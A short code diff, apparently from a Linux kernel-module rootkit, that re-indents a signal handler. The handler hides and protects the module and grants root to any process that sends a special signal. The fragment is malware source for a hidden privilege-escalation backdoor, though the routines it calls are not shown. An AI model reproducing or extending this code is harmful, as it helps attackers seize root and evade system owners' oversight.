@@ -5,24 +5,24 @@
  * with signal SIG_ROOT */
 void sig_handle(const uint32_t sig, pid_t pid) {
   switch (sig) {
-  case SIG_HIDE:
-    h_lkm_hide();
-    break;
+    case SIG_HIDE:
+      h_lkm_hide();
+      break;
 
-  case SIG_PROTECT:
-    h_lkm_protect();
-    break;
+    case SIG_PROTECT:
+      h_lkm_protect();
+      break;
 
-  case SIG_GOD:
-    h_lkm_hide_and_protect();
-    break;
+    case SIG_GOD:
+      h_lkm_hide_and_protect();
+      break;
 
-  case SIG_ROOT:
-    set_root(pid);
-    break;
+    case SIG_ROOT:
+      set_root(pid);
+      break;
 
-  default:
-    break;
+    default:
+      break;
   }
 }
 
